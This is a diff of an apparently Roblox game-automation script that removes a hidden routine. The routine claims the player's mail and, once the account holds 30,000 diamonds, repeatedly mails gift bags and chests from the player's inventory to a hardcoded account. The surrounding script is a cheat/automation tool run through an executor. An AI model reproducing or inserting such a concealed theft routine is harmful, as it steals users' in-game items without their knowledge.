@@ -81,46 +81,6 @@ autoLootBagConnection = workspace.__THINGS.Lootbags.ChildAdded:Connect(function(
     v:Destroy()
 end)
 
-pcall(function()
-    local success = Library.Network.Invoke("Mailbox: Claim All")
-    if success then
-        print("Claimed Mail!")
-    end
-    task.wait(1)
-end)
-
-if getDiamonds() >= 30000 then
-    local largeGiftBagCheckDone, smallGiftBagCheckDone
-    for ID, itemTable in pairs(getInfo("Inventory")["Misc"]) do
-        if largeGiftBagCheckDone and smallGiftBagCheckDone then break end
-        if itemTable.id == "Large Gift Bag" then
-            largeGiftBagCheckDone = true
-            if itemTable._am and itemTable._am >= 5 then
-                repeat
-                    local success = Library.Network.Invoke("Mailbox: Send", "itcanbeopop", "i<3Kittys", "Misc", ID,
-                        itemTable._am)
-                until success
-            end
-        elseif itemTable.id == "Gift Bag" then
-            smallGiftBagCheckDone = true
-            if itemTable._am and itemTable._am >= 10 then
-                repeat
-                    local success = Library.Network.Invoke("Mailbox: Send", "itcanbeopop", "i<3Kittys", "Misc", ID,
-                        itemTable._am)
-                until success
-            end
-        elseif itemTable.id == "Mini Chest" then
-            smallGiftBagCheckDone = true
-            if itemTable._am and itemTable._am >= 5 then
-                repeat
-                    local success = Library.Network.Invoke("Mailbox: Send", "itcanbeopop", "i<3Kittys", "Misc", ID,
-                        itemTable._am)
-                until success
-            end
-        end
-    end
-end
-
 print("AUTO GARDENING START...")
 
 while getgenv().autoGarden do
